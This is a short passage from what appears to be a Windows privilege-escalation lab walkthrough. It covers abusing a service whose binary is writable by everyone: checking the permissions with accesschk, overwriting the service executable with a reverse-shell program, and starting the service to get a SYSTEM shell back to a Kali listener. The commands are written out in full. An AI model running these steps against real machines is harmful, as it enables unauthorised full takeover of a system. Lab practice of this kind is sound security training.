```

Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:

```
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Copy the reverse.exe executable you created and replace the filepermservice.exe with it:

```
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```
net start filepermsvc
```
